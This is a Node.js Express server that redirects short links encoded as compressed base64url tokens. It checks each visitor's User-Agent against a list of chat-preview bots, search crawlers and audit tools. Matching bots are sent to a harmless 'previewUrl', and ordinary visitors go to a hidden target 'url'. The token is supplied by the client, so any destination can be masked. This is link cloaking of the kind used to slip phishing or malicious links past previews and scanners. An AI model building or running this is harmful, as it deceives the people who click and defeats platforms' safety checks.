const express = require('express');
const zlib = require('zlib');
const app = express();
const PORT = process.env.PORT || 3000;

const REDIRECT_MAP = JSON.parse(process.env.REDIRECT_MAP || '{}');

const BOT_PATTERNS = [
  'WhatsApp',
  'TelegramBot',
  'facebookexternalhit',
  'Twitterbot',
  'Slackbot',
  'Discordbot',
  'LinkedInBot',
  'SkypeUriPreview',
  'Viber',
  'Googlebot',
  'Bingbot',
  'Slurp',
  'DuckDuckBot',
  'Baiduspider',
  'YandexBot',
  'Sogou',
  'Exabot',
  'facebot',
  'ia_archiver',
  'Applebot',
  'Pinterestbot',
  'redditbot',
  'Snapchat',
  'Iframely',
  'Embedly',
  'outbrain',
  'W3C_Validator',
  'Chrome-Lighthouse',
  'SiteAuditBot',
  'SEMrush',
  'AhrefsBot',
  'MJ12bot',
  'DotBot',
  'Linespider',
  'ZoominfoBot',
  'Mail.RU_Bot',
  'Kakaotalk',
  'LineBot',
  'WeChat',
  'Instagram',
  'NextCloud',
  'Mattermost',
  'Rocket.Chat',
  'Element',
  'SignalBot'
];

function isBot(ua) {
  return BOT_PATTERNS.some(p => ua.includes(p));
}

function decodeToken(token) {
  const buff = Buffer.from(token, 'base64url');
  const decompressed = zlib.inflateSync(buff);
  return JSON.parse(decompressed.toString('utf8'));
}

function encodeToken(data) {
  const compressed = zlib.deflateSync(JSON.stringify(data));
  return compressed.toString('base64url');
}

app.get('/go/:token', (req, res) => {
  let data;
  try {
    data = decodeToken(req.params.token);
  } catch (e) {
    return res.status(400).send('Invalid token');
  }

  console.log(`Click: ref=${req.query.ref}, target=${data.url}`);

  if (isBot(req.get('User-Agent') || '')) {
    return res.redirect(301, data.previewUrl);
  }

  res.redirect(301, data.url);
});

app.get('/:slug', (req, res) => {
  const target = REDIRECT_MAP[req.params.slug];
  if (target) return res.redirect(301, target);
  res.status(404).send('Not found');
});

app.listen(PORT, () => console.log(`Running on port ${PORT}`));
